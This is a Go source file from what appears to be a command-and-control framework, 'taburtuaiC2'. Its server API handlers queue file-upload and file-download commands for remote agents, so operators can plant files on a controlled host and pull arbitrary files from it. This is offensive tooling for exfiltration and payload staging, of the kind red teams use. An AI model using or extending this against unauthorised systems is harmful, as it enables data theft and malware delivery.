package api

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/server/services"
	"github.com/mjopsec/taburtuaiC2/shared/types"
)

// UploadToAgent handles file upload to agent
func (h *Handlers) UploadToAgent(c *gin.Context) {
	agentID := c.Param("id")

	// Verify agent
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s", agent.Status))
		return
	}

	// Get file from form
	file, err := c.FormFile("file")
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "File not provided: "+err.Error())
		return
	}

	destinationPath := c.PostForm("destination_path")
	if destinationPath == "" {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Destination path not provided")
		return
	}

	// Read file content
	srcFile, err := file.Open()
	if err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to open file")
		return
	}
	defer srcFile.Close()

	fileContent, err := ioutil.ReadAll(srcFile)
	if err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to read file")
		return
	}

	// Encrypt if available
	var encryptedContent []byte
	isEncrypted := false

	if h.server.CryptoMgr != nil {
		encrypted, err := h.server.CryptoMgr.EncryptData(fileContent)
		if err != nil {
			h.server.Logger.Error("SYSTEM", "Failed to encrypt file: "+err.Error(), agentID, "", nil)
			c.Status(http.StatusInternalServerError)
			h.APIResponse(c, false, "", nil, "Failed to encrypt file")
			return
		}
		encryptedContent = []byte(encrypted)
		isEncrypted = true
	} else {
		encryptedContent = fileContent
	}

	// Create upload command
	cmd := &types.Command{
		ID:              uuid.New().String(),
		AgentID:         agentID,
		Command:         "internal_upload",
		OperationType:   "upload",
		DestinationPath: destinationPath,
		FileContent:     encryptedContent,
		IsEncrypted:     isEncrypted,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         300,
	}

	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogFileTransfer(agentID, "upload", file.Filename, fmt.Sprintf("%d", len(fileContent)), true)

	h.APIResponse(c, true, "File upload command queued", map[string]interface{}{
		"command_id": cmd.ID,
		"status":     cmd.Status,
	}, "")
}

// DownloadFromAgent handles file download from agent
func (h *Handlers) DownloadFromAgent(c *gin.Context) {
	agentID := c.Param("id")

	// Verify agent
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s", agent.Status))
		return
	}

	var req struct {
		SourcePath      string `json:"source_path" binding:"required"`
		DestinationPath string `json:"destination_path"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid request: "+err.Error())
		return
	}

	// Create download command
	cmd := &types.Command{
		ID:              uuid.New().String(),
		AgentID:         agentID,
		Command:         "internal_download",
		OperationType:   "download",
		SourcePath:      req.SourcePath,
		DestinationPath: req.DestinationPath,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         300,
	}

	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, fmt.Sprintf("DOWNLOAD %s", req.SourcePath), "Queued", true)

	h.APIResponse(c, true, "File download command queued", map[string]interface{}{
		"command_id": cmd.ID,
		"status":     cmd.Status,
	}, "")
}
